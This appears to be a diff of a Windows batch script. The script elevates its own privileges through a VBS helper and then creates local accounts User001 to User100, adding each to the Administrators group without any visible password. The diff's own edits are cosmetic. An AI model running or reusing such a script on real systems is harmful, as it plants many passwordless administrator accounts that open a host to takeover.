@@ -1,5 +1,4 @@
- @echo off
- CLS
+@echo off
 
 :init
  setlocal DisableDelayedExpansion
@@ -40,9 +39,6 @@
  setlocal & cd /d %~dp0
  if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
 
- ::::::::::::::::::::::::::::
- ::START
- ::::::::::::::::::::::::::::
 net user /add User001
 net user /add User002
 net user /add User003
@@ -244,4 +240,5 @@ net localgroup Administrators /add User097
 net localgroup Administrators /add User098
 net localgroup Administrators /add User099
 net localgroup Administrators /add User100
+
 exit
